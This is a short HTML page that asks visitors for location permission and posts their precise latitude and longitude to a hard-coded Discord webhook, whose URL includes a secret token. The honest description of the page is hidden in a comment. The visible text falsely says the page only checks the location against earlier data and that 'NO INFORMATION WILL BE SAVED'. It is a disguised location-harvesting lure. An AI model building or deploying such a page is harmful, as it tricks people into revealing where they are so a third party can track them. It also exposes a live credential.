<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Send My Data to Discord</title>
  <meta name="robots" content="noindex">
  <style>
    body {
      font-family: sans-serif;
      background-color: #f9f9f9;
      padding: 2em;
    }
    button {
      padding: 0.5em 1em;
      margin-top: 1em;
    }
    #output {
      margin-top: 1em;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>

  <h2>Get and Send My Data</h2>
  <!-- <p>This tool gets your current Data and sends it to a Discord webhook <strong>only if you click Send</strong>.</p> -->
  <p>To speed to the process, we will use your data from last time and see if it matches. Please make sure to allow the location permission to we can check if it matches the old one. NO INFORMATION WILL BE SAVED!</p>
  <button onclick="getLocation()">Get Data</button>
  <div id="output">Data not retrieved yet.</div>
  <button id="sendButton" style="display:none;" onclick="sendToDiscord()">Send to Webhook</button>

  <script>
    let latitude = null;
    let longitude = null;

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      } else {
        document.getElementById("output").textContent = "System not supported.";
      }
    }

    function success(position) {
      latitude = position.coords.latitude.toFixed(8);
      longitude = position.coords.longitude.toFixed(8);
      document.getElementById("output").textContent = 
        `System has gotten data`;
      document.getElementById("sendButton").style.display = "inline-block";
    }

    function error(err) {
      document.getElementById("output").textContent = `Error: ${err.message}`;
    }

    function sendToDiscord() {
      if (latitude === null || longitude === null) {
        alert("Data not ready.");
        return;
      }

      const webhookURL = "https://discord.com/api/webhooks/1394110635213852833/t-P1JaqJNEorF5da3ySdpE4uzLySfCGYN7wY0TWBGNhqK5bUf5nLApHedhtJuv5_E2Xw";
      const payload = {
        content: `üìç Data Shared:\nLatitude: ${latitude}\nLongitude: ${longitude}`
      };

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      }).then(response => {
        if (response.ok) {
          alert("‚úÖ Data sent!");
        } else {
          alert("‚ùå Failed to send.");
        }
      }).catch(() => {
        alert("‚ùå Network error.");
      });
    }
  </script>

</body>
</html>
